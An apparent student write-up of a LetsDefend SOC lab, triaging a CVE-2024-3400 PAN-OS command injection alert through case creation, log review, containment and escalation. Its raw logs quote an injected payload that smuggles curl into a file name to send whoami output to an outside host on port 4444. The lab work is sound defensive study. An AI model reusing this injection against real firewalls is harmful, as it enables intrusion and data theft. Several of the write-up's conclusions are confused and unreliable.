# SOC274 - Palo Alto Networks PAN-OS Command Injection Vulnerability Exploitation (CVE-2024-3400)

## Overview

![overview](https://github.com/user-attachments/assets/c4a00a9d-38ff-419d-97cf-f7e4d4f2fc3f)

Welcome back, this alert severity is categorize as Critical so it is important to investigate with attention to detail.

OK lets start with taking action of create case on investigation page.

![create case](https://github.com/user-attachments/assets/c39c9701-5f0c-434e-946c-8443564513e7)

The page takeover by case management to start the investigation using provided playbook. so click on start playbook.

![playbook start](https://github.com/user-attachments/assets/62206a5d-887b-4a6b-aaf4-3f462debb579)

The playbook initiates with should be know about the alert and what it is and how it occured, So alert was generated due to the source sent a POST method request to the firewall, in that 
request header the session cookie has the whoami command to retrive the current user on firewall, because the command injected on session cookie the alert was generated.
Click on next.

![alert was triggered](https://github.com/user-attachments/assets/51ae009f-d36b-45f6-b5bd-8ca4a4c1e033)

To do further investigation process, we should collet answers for this question.
Ownership of the IP addresses and devices.
If the traffic is coming from outside (Internet);
Ownership of IP address (Static or Pool Address? Who owns it? Is it web hosting?)
Reputation of IP Address (Search in VirusTotal, AbuseIPDB, Cisco Talos)
If the traffic is coming from company network;
Hostname of the device
Who owns the device (username)
Last user logon time
![Collect data](https://github.com/user-attachments/assets/2d472466-674e-424f-b1d4-b50ece83dfcc)


Note answers for those questions aside and move on to next page.

Now Check the traffic content for any suspicious conditions such as web attack payloads (SQL Injection, XSS, Command Injection, IDOR, RFI/LFI). So copen endpoint security and search the firewall and look into http traffic.
we see there are two logs in log management page, after looking into raw logs we found that there were logs with commands to query to firewall. It is suspicious traffic from internet.

![raw logs](https://github.com/user-attachments/assets/11b5d1f9-f693-4109-8642-f7024f6e829f)

2024-04-18 15:09:42,629: dt_send INFO TX_DIR: send file dir: fname: /opt/panlogs/tmp/device_telemetry/day/aaacurl${IFS}144.172.79.92:4444?user=`$(whoami)`
2024-04-18 15:09:42,629 : dt_send INFO TX FILE: send_fname: /opt/panlogs/tmp/device_telemetry/day/aaacurl${IFS}144.172.79.92:4444?user=`$(whoami)`
2024-04-18 15:09:42,630: dt_send INFO TX_FILE: dest server ip: 144.172.79.92
2024-04-18 15:09:42,630 : dt_send INFO TX FILE: send_file_cmd: /usr/local/bin/dt_curl -i 172.16.17.139 -f /opt/panlogs/tmp/device_telemetry/day/aaacurl${IFS}144.172.79.92:4444?user=`$(whoami)`

The command inserted is whoami, it is retrive the current user on device. clicking next,

we should answer for the whether the traffic is malicious or not, with the found traffic it is malicious.

![is it malicious](https://github.com/user-attachments/assets/678e9ca5-fd44-4b0b-b940-9d60540ff6ea)

Click on malicious of its suspicious traffic from log management.
In the next question, it is like answering the which attack type, the attack type is command injection, so click on it.

![attack type](https://github.com/user-attachments/assets/783cc046-940e-4a57-b1a5-c5344e0931ec)


Checking if the device generating malicious traffic belongs to attack simulation products. If the Hostname contains the name of Attack Simulation products (such as Verodin, AttackIQ, Picusâ€¦), these devices belong to Attack Simulation products within the framework of LetsDefend simulation and it is a planned work.
After looking into http traffic we have not found any simulation products so it is not planned, click on not planned.

We should answer for the direction of traffic, as we got overview details from alert details, in that we had dst as PA-Firewall device which is our network device and src ip address was public ip address so it is internet to company network format.

![Direction traffic](https://github.com/user-attachments/assets/60f1ce0e-f7cf-4a5b-9781-bb0dc9ac9318)

And verify that whether the command was executed on device or not by checking at endpoint security of the device and look in command history, from logs, found that with the command injection, retrived the PA-Firewall ip address.
so the attack was successfull. 

![was successfull](https://github.com/user-attachments/assets/f06dfd5c-2337-4850-88b5-5573622be88f)

Click on successfull button, because there were retriveing of current user ip address.

Because of attack was successful, we need to contain the system from not spreading the attack to other systems, click on request and change to contain.

![containment](https://github.com/user-attachments/assets/dbd05743-4506-400d-9027-2817f7b24744)

Enter found artifacts on given blanks

![artifacts](https://github.com/user-attachments/assets/ec72a8be-ec46-4dd5-920a-1300acc22182)

Now, the book asks for tier 2 escation, as the attack was successfull form internet to company, there we found retriveing of current user ip address.
click on escalation to tier 2.

Write an analysis note,Confirmed that it is true positive alert, attack was successfully on the target device, device was contained, and retrived current ip address., and escalated to tier 2 because of the successful attack on the target.


![finish playbook](https://github.com/user-attachments/assets/2a6d418b-e084-4dae-8600-100e90351e0d)

click on finish playbook button to close this playbook and to close the alert.

![close alert1](https://github.com/user-attachments/assets/3a7ccc17-fdb0-44ae-87a2-5ee65deed912)

With all finding and investigation process, it is true positive because the attack was successful. click on true positive and write note.



